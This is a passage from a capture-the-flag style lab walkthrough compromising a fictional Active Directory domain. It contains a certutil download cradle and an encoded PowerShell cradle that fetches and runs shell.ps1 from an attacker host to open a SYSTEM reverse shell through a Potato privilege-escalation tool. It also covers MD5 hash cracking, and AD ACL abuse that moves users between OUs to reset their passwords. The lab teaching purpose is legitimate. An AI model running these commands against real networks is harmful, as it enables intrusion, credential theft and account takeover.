> Crystal port of GodPotato to abuse SeImpersonatePrivilege with indirect syscalls, dynamic API resolution and compile-time string obfuscation. Run commands, reverse shells or add users

Same technique as the classic GodPotato — coerce a SYSTEM token over a named-pipe/DCOM connection and catch it with `SeImpersonatePrivilege` — but rewritten in Rust with indirect syscalls and compile-time string obfuscation, so the binary itself is quieter under static analysis and AV. On the internal SQL box we didn't need the stealth; we needed a current, reliable member of the Potato family, and CrystalPotato is that. The same binary pulls the same trick later on the Defender-watched research web server in [Section 20.4](#204-webshell--crystalpotato--system), where the obfuscation actually earns its keep. The full Potato-family detour — why this primitive works, and why Crystal over God — lives in [Appendix A](#appendix-a-the-seimpersonate-potato--crystalpotato).

We pull it down over the existing `svc_mssql` shell. Start the *second* listener on `9295` first — this callback is the SYSTEM one, distinct from the `9294` shell:

```bash
➜ rlwrap -cAr ncat -lnvp 9295
```

Upload the potato with a `certutil` download-cradle from the attacker box:

```bash
PS > certutil -urlcache -f -split http://192.168.211.2/CrystalPotato.exe potato.exe
```

Test it before betting the shell on it — `-c whoami` runs a single command through the impersonated token:

```bash
PS > .\potato.exe -c whoami
nt authority\system
```

`nt authority\system` — the SeImpersonate coercion landed. Now run the same PowerShell cradle as before through it; the callback arrives on `9295` as SYSTEM:

```bash
PS > .\potato.exe -c 'powershell.exe -ep bypass -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADEAMQAuADIALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA'
```

Second shell comes in — this one is SYSTEM:

```bash
Ncat: Connection from 10.0.10.20:50050.

PS > whoami; hostname
nt authority\system
SQL
```

SYSTEM on SQL. Read the flag:

```bash
PS > type C:\Users\Administrator\Desktop\flag.txt
Flag01{SILVER_XXXXXXX_XXXXXXXX_XXXXX_BACKUPS}
## captured flag #1..
```

**Full compromise of the hidden SQL host** — no credentials for `m.thompson` or `j.walsh` required. The sysadmin group membership we couldn't log in with, we simply *wrote into* a ticket signed by a key the domain already let us have.

## 10.7 The Backup — Westbridge.bak

The flag text itself points at the next step (`...MSSQL_BACKUPS`), and there it is:

```powershell
PS > dir C:\backup

    Directory: C:\backup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----   7/3/2026   6:16 PM   3067904   Westbridge.bak
```

The custom `Westbridge` database — the one every login was locked out of back in [Section 10.2](#102-mapping-the-instance) — sitting as a raw `.bak`.

`RESTORE DATABASE` is executed by the **SQL Server engine**, not our client prompt, and the engine reads the backup off disk **as the service account** (`svc_mssql` here — proven by the [Section 10.3](#103-coercion-check--who-does-the-service-run-as) `xp_dirtree` callback). `C:\backup` is a restricted folder whose ACL doesn't grant that account read, so a direct `RESTORE ... FROM 'C:\backup\Westbridge.bak'` dies with **OS error 5 (Access is denied)**. Step one: copy it somewhere world-readable.

```powershell
# 1) Copy the .bak somewhere the engine (running as svc_mssql) can read
PS > copy C:\Backup\Westbridge.bak C:\Users\Public\
```

We don't exfil the `.bak` — we're `sysadmin` on the instance (that's the whole point of the [Section 10.5](#step-3--forge-the-ticket) silver ticket), so we restore it locally and read the tables straight out. Reconnect over Kerberos with the forged silver ticket (the ccache, not the original TGT):

```bash
# 2) Connect over Kerberos with the forged silver ticket
➜ env KRB5CCNAME=svc_mssql.ccache \
mssqlclient.py \
    'westbridge.hsm/svc_mssql@sql.westbridge.hsm' -k -no-pass
```

Before restoring, preview the backup's logical files — `RESTORE FILELISTONLY` lists the internal `.mdf`/`.ldf` names we must redirect with `WITH MOVE`:

```bash
# 3) Preview the backup's logical files — we need their names for WITH MOVE
SQL (WESTBRIDGE\svc_mssql  dbo@master)> RESTORE FILELISTONLY FROM DISK = 'C:\Users\Public\Westbridge.bak';

LogicalName      PhysicalName                                                                              Type   FileGroupName      Size       MaxSize   FileId   CreateLSN   DropLSN                               UniqueId   ReadOnlyLSN   ReadWriteLSN   BackupSizeInBytes   SourceBlockSize   FileGroupId   LogGroupGUID   DifferentialBaseLSN                   DifferentialBaseGUID   IsReadOnly   IsPresent   TDEThumbprint   SnapshotUrl
--------------   ---------------------------------------------------------------------------------------   ----   -------------   -------   -----------   ------   ---------   -------   ------------------------------------   -----------   ------------   -----------------   ---------------   -----------   ------------   -------------------   ------------------------------------   ----------   ---------   -------------   -----------
Westbridge       C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\Westbridge.mdf       D      PRIMARY         8388608   35184372080640        1           0         0   5E15DE45-2E03-4DB6-ABA2-29FF45152434             0              0             2818048              4096             1           NULL                     0   00000000-0000-0000-0000-000000000000            0           1            NULL   NULL
Westbridge_log   C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\Westbridge_log.ldf   L      NULL            8388608   2199023255552        2           0         0   3D927A21-0A54-4071-9119-88CA96FE5B6B             0              0                   0              4096             0           NULL                     0   00000000-0000-0000-0000-000000000000            0           1            NULL   NULL
```

Two logical files: `Westbridge` (data, type `D`) and `Westbridge_log` (log, type `L`). Now restore to a **fresh database name** (`Westbridge_Restore`) rather than over the existing `Westbridge` — the live DB rejected `svc_mssql` in [Section 10.2](#102-mapping-the-instance), and a fresh copy sidesteps that lockout. Each logical file is redirected to a new path via `WITH MOVE`, and `REPLACE` overwrites any stub:

```bash
# 4) Restore to a fresh DB name, redirecting each file to a new path (REPLACE = overwrite any stub)
SQL (WESTBRIDGE\svc_mssql  dbo@master)> RESTORE DATABASE Westbridge_Restore FROM DISK = 'C:\Users\Public\Westbridge.bak' WITH MOVE 'Westbridge' TO 'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\Westbridge_Restore.mdf', MOVE 'Westbridge_log' TO 'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\Westbridge_Restore_log.ldf', REPLACE;

INFO(SQL): Line 1: Processed 360 pages for database 'Westbridge_Restore', file 'Westbridge' on file 1.
INFO(SQL): Line 1: Processed 2 pages for database 'Westbridge_Restore', file 'Westbridge_log' on file 1.
INFO(SQL): Line 1: RESTORE DATABASE successfully processed 362 pages in 0.482 seconds (5.859 MB/sec).
```

Restore succeeded. Switch into it with `USE`, then enumerate the tables — `INFORMATION_SCHEMA.TABLES` lists what we can now read:

```bash
# 5) Open it and list the tables
SQL (WESTBRIDGE\svc_mssql  dbo@master)> USE Westbridge_Restore;
ENVCHANGE(DATABASE): Old Value: master, New Value: Westbridge_Restore

SQL (WESTBRIDGE\svc_mssql  dbo@Westbridge_Restore)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
TABLE_NAME
---------------
LearningContent
StudentFinance
SQLManagement
```

# 11. Credentials in the Database

The `Westbridge_Restore` database holds three tables, and `SQLManagement` is the interesting one — a maintenance-account register that maps **domain** identities to passwords. These aren't just SQL logins; they're the same accounts that log into the domain, which is what makes the table a credential store rather than a DB config. Pulling it:

```bash
SQL (WESTBRIDGE\svc_mssql  dbo@Westbridge_Restore)> SELECT * FROM SQLManagement;
EntryID   Username     Password                           Role                DatabaseName   DefaultSchema   LastLogin   AccountStatus   Notes
-------   ----------   --------------------------------   -----------------   ------------   -------------   ---------   -------------   ---------------------------------------------------------------------------
      1   m.thompson   3cc31cd246149aec68079241e71e98f6   SQL Administrator   Westbridge     dbo             NULL        Enabled         Westbridge MSSQL management account record. No password stored in database.
      2   j.walsh      d75b2e8cbad743869717c06d7049efc9   Database Operator   Westbridge     dbo             NULL        Enabled         Operational database account record. Password field intentionally empty.
```

Both password fields are MD5 hashes — and the "no password stored" / "intentionally empty" notes are misdirection: the hash column is plainly populated. `hashcat -m 0` against rockyou cracks `m.thompson` instantly (his hash was already in the potfile from the [Section 6](#6-as-rep-roasting--svc_legacy) AS-REP work):

```bash
➜ hashcat --identify /tmp/hashes.txt
The following 12 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash

➜ hashcat -a 0 -m 0 /tmp/hashes.txt /opt/SecLists/rockyou.txt

➜ hashcat -a 0 -m 0 /tmp/hashes.txt --show
3cc31cd246149aec68079241e71e98f6:Pa$$w0rd
```

And look who that is: **m.thompson — IT Tier1 Support and MSSQL Maintenance, the same identity the People Directory had flagged as an administrator.** The human we were hunting in [Section 10.4](#the-prize-westbridgemssql-maintenance) just handed us his password through his own management records. (`j.walsh`'s hash still pending crack.)

# 12. Mapping the OUs — Who Lives Where

With m.thompson's password in hand, it's worth stepping back and reading the domain's organizational structure properly. The BloodHound graphs in this section come from two collections: the domain-wide ACL dump we ran as `svc_mssql` back in [Section 8.2](#82-bloodhound-collection) — that's what surfaces the OU rosters (who lives in IT TIER1, IT TIER2, IT TIER3, and STUDENTS) — and a second collection we'll run in [Section 12.2](#122-execution-rights-live-on-containers-not-people) as m.thompson himself, which is what reveals his own group memberships and outbound edges. We show the m.thompson picture in [Section 12.1](#121-the-mthompson-picture) now because it's the key to the next move, but the graph itself is from the Section 12.2 collection.

BloodHound's OU view is the map of *who lives where*:

![BloodHound — full OU structure](/assets/images/westbridge-bh-ou-structure.png)

The full graph also shows cross-forest principals, service accounts, and domain controllers — but the three-tier IT hierarchy plus the student population is where the exploitation story plays out.

## 12.1 The m.thompson Picture

![BloodHound — m.thompson group memberships](/assets/images/westbridge-bh-mthompson-membersof.png)

|| Group | Meaning ||
||---|---|
|| IT TIER1 SUPPORT | day-to-day ops identity ||
|| MSSQL MAINTENANCE | sysadmin on SQL (confirmed in practice [Section 10.4](#the-prize-westbridgemssql-maintenance)) ||
|| STUDENT ACCOUNT ADMINISTRATORS | *manages student accounts* ||

These are **m.thompson's group memberships** — not the OU roster. The three OUs below (IT TIER1/2/3) each carry their own populations; this table is just the identity sitting in IT TIER1.

Outbound object control (the interesting part):

![BloodHound — m.thompson GenericAll over the STUDENTS OU](/assets/images/westbridge-bh-mthompson-genericall-students.png)

**GenericAll over the whole STUDENTS OU** — which inherits down to every account inside. In AD, `GenericAll` on an OU = reset any member's password (`ForceChangePassword`-equivalent), set SPNs/keyCredentials, move objects in/out, write any attribute. That's the wedge we exploit in a moment.

With GenericAll over the STUDENTS OU, m.thompson can move any object in or out of that OU — including users from other tiers. The two Tier-1 operators we'll relocate into STUDENTS territory (both about to get moved into space we already own):

* **r.anderson** ➜ File Server Support ➜ the `Scripts` + `IT-Share` shares on FILES that
  svc_mssql couldn't touch
* **c.wilson** ➜ Account Policy Administrators ➜ can manage *account policies*
  (read: password resets across the domain)

### 12.1.1 IT TIER1 — the operators

![BloodHound — IT TIER1 OU](/assets/images/westbridge-bh-ou-it-tier1.png)

The IT TIER1 OU contains two user accounts: **r.anderson** and **c.wilson** — the BloodHound graph above shows exactly those two. (m.thompson isn't in this view because he's the identity doing the looking; his own group memberships are broken out separately in [Section 12.1](#121-the-mthompson-picture).)

The two accounts the graph surfaces as Tier1 neighbors:

![BloodHound — r.anderson memberof](/assets/images/westbridge-bh-randerson-memberof.png)
![BloodHound — c.wilson memberof](/assets/images/westbridge-bh-cwilson-memberof.png)

* **r.anderson** — Member of the **File Server Support Group** — runs the `Scripts` and `IT-Share` shares on FILES
* **c.wilson** — Member of the **Account Policy Administrators Group** — can manage account policies domain-wide (password resets, logon restrictions, account settings)

m.thompson is also a Tier1 operator (his full group memberships are broken out in [Section 12.1](#121-the-mthompson-picture)) — and he holds **GenericAll over the entire STUDENTS OU**, which is the wedge we exploit in a moment. Tier1 = the people who run day-to-day services — file servers and databases.

### 12.1.2 IT TIER2 — the provisioners

![BloodHound — IT TIER2 OU](/assets/images/westbridge-bh-ou-it-tier2.png)

The IT TIER2 OU contains three human provisioners — the BloodHound graph above surfaces exactly those three: **b.wellington**, **c.anderson**, and **s.harrison**. (svc_krb_t2 isn't a resident of this OU in the same way — it's the service account that holds **GenericAll over the IT TIER2 group**, the account layer that creates and manages other identities. We deep-dive its graph and abuse path in [Section 15.6](#156-bonus-loot-keytabs-everywhere) and [Section 16.2](#162-svc_krb_t2-mints-itself-an-ou).)

The three provisioners who staff this tier:

* **b.wellington** — Tier 2 provisioner
* **c.anderson** — Tier 2 provisioner
* **s.harrison** — Tier 2 provisioner (helpdesk-level; his restricted logon hours become relevant in [Section 16.3](#163-why-invalid-logon-hours-time-based-access-control), and his group memberships are broken out in [Section 16.5](#165-who-is-s-harrison))

### 12.1.3 IT TIER3 — the admins

![BloodHound — IT TIER3 OU](/assets/images/westbridge-bh-ou-it-tier3.png)

The IT TIER3 OU contains three admins — the BloodHound graph above shows exactly those three: **a.owen**, **b.jones**, and **d.hoff**.

The three admins who staff this tier:

![BloodHound — a.owen memberof](/assets/images/westbridge-bh-aowen-memberof.png)

* **a.owen** — Member of the **CA-Manager Group** — controls the enterprise CA that signs every TLS cert in the domain. We explain the full CA-Manager exploitation path (ESC4 on the certificate template, ESC4 → privileged certificate → DC compromise) in [Section 18](#18-privesc-dc01-esc4-on-the-ca).
* **b.jones** — Domain Users only — no special groups.
* **d.hoff** — Domain Users only — no special groups.

The external controller for this tier — the account that holds GenericAll over IT TIER3 — isn't visible in the OU graph above. It's flagged as an anomaly in [Section 9.4](#non-default-acl-edges) (RID 9510) and resolved in [Section 17.4](#174-j-dillon--it-tier3--a-owen): it turns out to be **j.dillon**, an AD tombstone we revive. The full Tier-3 exploitation chain (j.dillon's GenericAll → a.owen's password reset → CA administration) is covered there.

Tier 3 is the CA's front door. We keep it simple here and come back for the full chain later.

### 12.1.4 STUDENTS — the target-rich environment

![BloodHound — Students OU](/assets/images/westbridge-bh-ou-students.png)

A dozen-plus student accounts — and per our earlier ACL mining, **m.thompson has GenericAll over this entire OU**. GenericAll on an OU inherits down to every account inside: password resets, SPN/keyCredential writes, object moves, arbitrary attribute writes. That's not a detail; that's a weapon. We break down exactly what m.thompson can do with it in [Section 12.1](#121-the-mthompson-picture).

## 12.2 Execution — Rights Live on Containers, Not People

First, validate the cracked password estate-wide and re-collect BloodHound *as m.thompson* (the graph should reflect what a Tier1 operator actually sees):

```bash
➜ nxc smb 10.0.10.0/24 \
    -u 'm.thompson' -p 'Pa$$w0rd'

SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\m.thompson:Pa$$w0rd
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\m.thompson:Pa$$w0rd
```

Before touching anything, dump the ACLs on the IT TIER1 OU — and here's the twist that makes this lab clever. m.thompson does **not** hold GenericAll there:

```bash
➜ powerview \
    westbridge.hsm/m.thompson:'Pa$$w0rd'@dc.westbridge.hsm

╭─LDAPS─[DC.westbridge.hsm]─[WESTBRIDGE\m.thompson]-[NS:<auto>]
╰─ ❯ Get-DomainObjectAcl "OU=IT Tier1,DC=westbridge,DC=hsm" -ResolveGUIDs
ObjectDN            : OU=IT Tier1,DC=westbridge,DC=hsm
AccessControlType   : AccessAllowed
AceType             : ACCESS_ALLOWED_OBJECT_ACE
AccessMask          : WriteProperty
ObjectAceType       : RDN                    rename user objects
InheritanceType     : ContainerInherit, InheritOnly
SecurityIdentifier  : WESTBRIDGE\m.thompson

....
ObjectAceType       : Common-Name            rename user objects
InheritanceType     : ContainerInherit, InheritOnly
SecurityIdentifier  : WESTBRIDGE\m.thompson
....
ObjectAceType       : Public-Information     🡐 write limited properties
InheritanceType     : ContainerInherit, InheritOnly
SecurityIdentifier  : WESTBRIDGE\m.thompson
....
ObjectDN            : OU=IT Tier1,DC=westbridge,DC=hsm
AccessControlType   : AccessAllowed
AceType             : ACCESS_ALLOWED_OBJECT_ACE
AccessMask          : DeleteChild            🡐 remove objects from the OU
SecurityIdentifier  : WESTBRIDGE\m.thompson
```

Three WriteProperty ACEs (RDN, Common-Name, Public-Information) let m.thompson rename users and tweak a few attributes — but the real mover is the fourth entry: **DeleteChild on the OU itself**. That's the permission that lets him pull objects out of IT Tier1. Powerview surfaces it cleanly because `-ResolveGUIDs` translates the GUIDs; the raw SDDL (what you'd get from `bloodyAD get object --attr nTSecurityDescriptor`) is the same ACEs but as hex masks and OID strings.

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    get object 'OU=IT Tier1,DC=westbridge,DC=hsm' \
    --attr nTSecurityDescriptor

distinguishedName: OU=IT Tier1,DC=westbridge,DC=hsm
nTSecurityDescriptor: O:...G:...D:AI(D;;0x10040;;;S-1-1-0)
  (OA;CIIO;WP;bf967a0e...;bf967aba...;S-1-5-21-...-1103)    🡐 RDN / rename
  (OA;CIIO;WP;bf96793f...;bf967aba...;S-1-5-21-...-1103)    🡐 Common-Name
  (OA;CIIO;WP;e48d0154...;bf967aba...;S-1-5-21-...-1103)    🡐 Public-Information
  (OA;CIIO;SD;;bf967aba...;S-1-5-21-...-1103)               🡐 DeleteChild
  (A;;DC;;;S-1-5-21-...-1103)                               🡐 Delete
  (A;;0xf01ff;;;S-1-5-21-...-1103)(A;;0x20094;;;S-1-5-9)...
```

Same ACEs Powerview surfaced at 1413–1436, just in raw SDDL instead of `-ResolveGUIDs`-decoded form. The meaningful pieces:

- `D:AI(...)` — the DACL; `AI` = inherit-only container ACE, so these rights flow down into IT Tier1's contents but aren't exercised on the OU object itself.
- `WP;bf967a0e` / `WP;bf96793f` / `WP;e48d0154` — WriteProperty on RDN, Common-Name, and Public-Information, i.e. rename and tweak a few attributes on the users inside.
- `SD;;bf967aba` — DeleteChild on the OU, which is what lets m.thompson pull objects out of IT Tier1 (the move primitive PowerView's `Set-DomainObjectDN` uses under the hood).
- `A;;DC` — Delete on the OU as well; reinforced delete path.
- `0xf01ff` — FullControl mask on a couple of well-known SIDs (domain admins, system, etc.), the normal "admins own this" entries.

Powerview is the readable layer; bloodyAD's SDDL is the ground truth. They describe the same three WriteProperty ACEs plus DeleteChild — the IT Tier1 ACLs that stop m.thompson one step short of a password reset.

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    get writable

distinguishedName: CN=r.anderson,OU=IT Tier1,DC=westbridge,DC=hsm
permission: WRITE
....
distinguishedName: OU=STUDENTS,DC=westbridge,DC=hsm
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

`WRITE` on r.anderson and c.wilson bundles the rename + move rights. `CREATE_CHILD; WRITE` plus `OWNER: WRITE` and `DACL: WRITE` on STUDENTS is full control — that's the GenericAll inheritance we spotted in [Section 9.4](#non-default-acl-edges).

Rename, move, delete — but **no password-reset right**. The IT TIER1 ACEs deliberately stop one step short.

While the **WriteProperty** permissions let us rename users and tweak a few attributes, they don't let us reset passwords — the IT TIER1 ACEs deliberately stop one step short. But **DeleteChild on the OU** + **CreateChild on STUDENTS** (from GenericAll) is enough: AD moves an object by deleting it from the source OU and creating it in the destination. We have both ends of that transaction.

So we make the victims walk into a container where our rights are total. One move tool at a time.

## Move the target users into STUDENTS — bloodyAD first

The first move rewrites the user's `distinguishedName` in-place on the DC. We tell bloodyAD which object to patch, which attribute to set, and the new DN that drops it into `OU=Students`. For r.anderson:

```bash
➜ bloodyad --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    set object 'CN=r.anderson,OU=IT Tier1,DC=westbridge,DC=hsm' \
    distinguishedName -v 'CN=r.anderson,OU=Students,DC=westbridge,DC=hsm'

[+] CN=r.anderson,OU=IT Tier1,DC=westbridge,DC=hsm's distinguishedName has been updated
```

That one command does the source-side deletion: AD treats the `distinguishedName` change as a move, so the object is removed from `OU=IT Tier1` and recreated under `OU=Students` — exactly the DeleteChild + CreateChild transaction the IT Tier1 / STUDENTS ACLs permit. The `-v` value is the full new DN, not just the OU; the object's CN stays the same, only its location changes.

Same shape for c.wilson, second command in its own block:

```bash
➜ bloodyad --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    set object 'CN=c.wilson,OU=IT Tier1,DC=westbridge,DC=hsm' \
    distinguishedName -v 'CN=c.wilson,OU=Students,DC=westbridge,DC=hsm'

[+] CN=c.wilson,OU=IT Tier1,DC=westbridge,DC=hsm's distinguishedName has been updated
```

Both users are now children of `OU=Students`, which means m.thompson's GenericAll inherits down onto each of them as FullControl — including the right to write `unicodePwd`.

## Move the target users — Powerview alternative

The same relocation can be done with PowerView's `Set-DomainObjectDN`, which wraps the `distinguishedName` rewrite in one call per user. r.anderson:

```bash
╭─LDAPS─[DC.westbridge.hsm]─[WESTBRIDGE\m.thompson]-[NS:<auto>]
╰─ ❯ Set-DomainObjectDN -Identity r.anderson \
    -DestinationDN 'OU=Students,DC=westbridge,DC=hsm'

[+] Success! modified new dn for CN=r.anderson,OU=IT Tier1,DC=westbridge,DC=hsm
```

And c.wilson:

```bash
╭─LDAPS─[DC.westbridge.hsm]─[WESTBRIDGE\m.thompson]-[NS:<auto>]
╰─ ❯ Set-DomainObjectDN -Identity c.wilson \
    -DestinationDN 'OU=Students,DC=westbridge,DC=hsm'

[+] Success! modified new dn for CN=c.wilson,OU=IT Tier1,DC=westbridge,DC=hsm
```

Both tools do the same underlying op — rewrite the DN so the object leaves IT Tier1 and lands in STUDENTS. PowerView is the shorter path for pure moves; bloodyAD's `set object ... distinguishedName` is the explicit form if you're already working in that CLI. The important nuance: a raw `distinguishedName` write is only a move if AD itself accepts it as one, which requires the caller to hold the right to remove the object from the source container **and** create it in the destination. In this lab m.thompson has DeleteChild on IT Tier1 and CreateChild (from inherited GenericAll) on STUDENTS, so the bloodyAD DN write goes through as a move; if either side were missing, the same command would fail at the DC even though the syntax is identical. PowerView's `Set-DomainObjectDN` is built around that two-sided requirement explicitly, which is why it's the safer default when you're not certain the caller holds both ends of the transaction. (For object moves specifically, `Set-DomainObjectDN` handles the `distinguishedName` rewrite cleanly — bloodyAD's `set object` doesn't expose a dedicated move verb, so you pass the attribute and new value directly.)

The instant they land under `OU=Students`, m.thompson's **GenericAll inherits down as FullControl onto each of them** — which covers writing `unicodePwd`. Now the resets work.

## Reset the passwords — bloodyAD

First reset: r.anderson. The command targets the user by sAMAccountName, takes the new password as the next argument, and writes `unicodePwd` on the object now sitting in STUDENTS:

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    set password 'r.anderson' 'SecretMyth123!'

[+] Password changed successfully!
```

Second reset: c.wilson, same shape, next command:

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    set password 'c.wilson' 'SecretMyth123!'

[+] Password changed successfully!
```

`set password` is the bloodyAD verb that writes `unicodePwd` — that's the attribute a password reset actually touches. It only succeeds because the caller holds a write right on the object; inside IT Tier1 m.thompson didn't hold that right, which is why these resets fail there. Once the users are relocated into STUDENTS, the inherited GenericAll gives him the needed write right (in this environment the OU-level GenericAll is enough to write `unicodePwd` on the now-descendant objects; that's not automatic from OU inheritance alone in every domain — deny ACEs, protected groups, or per-object ACLs can still block the reset even after a successful move). So the same `set password` calls that were blocked in IT Tier1 now go through — but only because the move put the targets under an OU whose ACLs actually permit the write, not because relocation by itself confers password rights.

Two target users relocated, zero password-guessing:

* **r.anderson** — File Server Support ➜ should unlock the `Scripts` and `IT-Share` shares
  that rejected every account we own
* **c.wilson** — Account Policy Administrators ➜ account-policy control for later abuse

The whole stage is one idea: **ACLs attach to containers and inherit downward.** You don't always need to escalate *against* an object — sometimes you just relocate the object into territory you already own.

# 13. FILES — The Scripts Share

## 13.1 Enumeration as r.anderson

### 13.1.1 Port Scan — FILES (10.0.10.15)

```bash
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info:
|   Target_Name: WESTBRIDGE
|   NetBIOS_Domain_Name: WESTBRIDGE
|   NetBIOS_Computer_Name: FILES
|   DNS_Domain_Name: westbridge.hsm
|   DNS_Computer_Name: FILES.westbridge.hsm
|   DNS_Tree_Name: westbridge.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-07-14T20:21:11+00:00
| ssl-cert: Subject: commonName=FILES.westbridge.hsm
| Issuer: commonName=FILES.westbridge.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T19:53:42
| Not valid after:  2027-01-01T19:53:42
| MD5:   73cd 6957 19fc b4e8 3664 93aa 8924 ea2f
|_SHA-1: a806 59e5 b095 a802 19df 72a5 3105 a03d 699f f84d
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc              Microsoft Windows RPC
49669/tcp open  msrpc              Microsoft Windows RPC
```

Check Creds:

```bash
➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!'
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
```

The reset paid for itself immediately — `File Server Support` opens the share that rejected every account we owned:

```bash
➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!' \
     --shares
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
SMB         10.0.10.15      445    FILES            [*] Enumerated shares
SMB         10.0.10.15      445    FILES            Share           Permissions            Remark
SMB         10.0.10.15      445    FILES            -----           -----------            ------
SMB         10.0.10.15      445    FILES            ADMIN$                                 Remote Admin
SMB         10.0.10.15      445    FILES            C$                                     Default share
SMB         10.0.10.15      445    FILES            IPC$            READ                   Remote IPC
SMB         10.0.10.15      445    FILES            IT-Share                               IT Internal - Administrators Only
SMB         10.0.10.15      445    FILES            Scripts         READ                   File Server Support members only
SMB         10.0.10.15      445    FILES            Students        READ                   Public student resources and academic documents
```

`spider_plus` over the readable shares: 15 files, 13 of them noise (campus PDFs, pictures, even Procmon/VS installers under `Students\Tools`). But `Scripts\` holds exactly two PowerShell scripts — and one of them is the next stage of this lab:

```bash
➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!' \
    --shares -M spider_plus
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
SPIDER_PLUS 10.0.10.15      445    FILES            [+] Saved share-file metadata to "/home/kaladin/.nxc/modules/nxc_spider_plus/10.0.10.15.json".
SPIDER_PLUS 10.0.10.15      445    FILES            [*] SMB Shares:           6 (ADMIN$, C$, IPC$, IT-Share, Scripts, Students)
SPIDER_PLUS 10.0.10.15      445    FILES            [*] SMB Readable Shares:  3 (IPC$, Scripts, Students)
SPIDER_PLUS 10.0.10.15      445    FILES            [*] Total files found:    15
```

```bash
➜ cat /home/kaladin/.nxc/modules/nxc_spider_plus/10.0.10.15.json
{
    "Scripts": {
        "installed_updates.ps1": {
            "atime_epoch": "2026-07-07 20:19:02",
            "ctime_epoch": "2026-07-07 20:19:02",
            "mtime_epoch": "2026-07-07 20:19:02",
            "size": "998 B"
        },
        "webserver_monitor.ps1": {
            "atime_epoch": "2026-07-07 22:02:00",
            "ctime_epoch": "2026-07-07 20:17:14",
            "mtime_epoch": "2026-07-07 22:02:00",
            "size": "1.05 KB"
        }
    }
}
```

The JSON covers two readable shares — `Scripts` (2 files, both PowerShell) and `Students` (13 files of campus PDFs, pictures, and Procmon/VS installers — all noise). The only files that matter are the two in `Scripts`:

```bash
➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!' \
    --share 'Scripts' \
    --get-file installed_updates.ps1 installed_updates.ps1
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
SMB         10.0.10.15      445    FILES            [*] Copying "installed_updates.ps1" to "installed_updates.ps1"
SMB         10.0.10.15      445    FILES            [+] File "installed_updates.ps1" was downloaded to "installed_updates.ps1"

➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!' \
    --share 'Scripts' \
    --get-file webserver_monitor.ps1 webserver_monitor.ps1
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
SMB         10.0.10.15      445    FILES            [*] Copying "webserver_monitor.ps1" to "webserver_monitor.ps1"
SMB         10.0.10.15      445    FILES            [+] File "webserver_monitor.ps1" was downloaded to "webserver_monitor.ps1"
```

